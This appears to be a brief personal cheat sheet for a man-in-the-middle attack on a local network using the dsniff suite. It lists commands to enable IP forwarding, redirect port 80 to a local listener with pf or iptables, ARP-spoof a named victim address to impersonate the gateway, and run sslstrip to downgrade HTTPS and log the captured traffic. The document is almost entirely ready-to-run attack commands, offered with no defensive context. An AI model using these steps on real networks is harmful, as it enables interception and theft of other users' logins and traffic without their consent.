# dsniff

## enable ports forward

on mac

	sudo sysctl -w net.inet.ip.forwarding=1
	sudo sysctl -w net.inet.ip.fw.enable=1
	sudo sysctl -w net.inet.fw.verbose=1
	sudo sysctl -w net.inet.ip.fw.verbose=1

on ubuntu

	vim /etc/sysctl.conf

change net.ipv4.ip_forward=0 to net.ipv4.ip_forward=1 

enable it

	sysctl -p

## port redirect

on mac <a href="https://developer.apple.com/library/mac/documentation/Darwin/Reference/ManPages/man5/pf.conf.5.html" >pf</a> 

	vim /etc/pf.conf

set configuration

	rdr pass on inet en0 proto { tcp, udp } from any to any port 80 -> 127.0.0.1 port 8000

enable it 

	pfctl -v -n -f /etc/pf.conf
	pfctl -f /etc/pf.conf

on ubuntu <a href="https://help.ubuntu.com/community/IptablesHowTo">iptables</a>

enable iptables

	modprobe ip_tables

port redirect

	iptables -t nat -A PREROUTING -d *.*.*.* -p tcp --dport 80 -j DNAT --to-destination 127.0.0.1:8000

check

	iptables -t nat --list


delete

	iptables -t nat -D PREROUTING 1

## arp spoof

spoof machine with ip 192.168.0.49 on mac address of 192.168.0.1 by mac address of en0

	sudo arpspoof -i en0 -t 192.168.0.49 192.168.0.1

## ssl strip

	sslstrip -a -l 8000 -w sslstrip.log
	tail -f sslstrip.log

